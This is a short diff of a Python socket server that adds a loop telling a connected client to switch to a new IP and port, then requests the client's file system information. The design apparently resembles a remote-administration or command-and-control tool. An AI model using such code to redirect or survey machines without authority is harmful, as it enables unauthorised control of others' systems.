@@ -74,19 +74,16 @@ if __name__ == '__main__':
         # data = conn.recv(BUFFER_SIZE)  # ok for packgae
 
         # Change IP
-        # while True: # TODO: timeout or scheduler
-        #     conn.send("CHANGE_IP".encode())
-        #     data = conn.recv(2)  # ok for packgae
-        #     # send size of packet
-        #     packet_str = "%s:%s" % (NEW_IP, NEW_PORT)
-        #     conn.send(str(len(packet_str)).encode())
-        #     data = conn.recv(2)  # ok for packgae
-        #     conn.send(packet_str.encode())
-        #     data = conn.recv(2)  # ok for packgae
-        #     data = conn.recv(6)
-        #     if data.decode() == 'accept':
-        #         print(str(data))
-        #         break
+        while True: # TODO: timeout or scheduler
+            SocketManager.send_data(conn, "CHANGE_IP")
+            packet_str = "%s:%s" % (NEW_IP, NEW_PORT)
+            SocketManager.send_data(conn, packet_str)
+            response_from_client = SocketManager.receive(conn)
+            if response_from_client == 'accept':
+                print(response_from_client)
+                break
+            else:
+                print(response_from_client)
 
         # file system info
         SocketManager.send_data(conn, "FILE_SYSTEM_INFO")
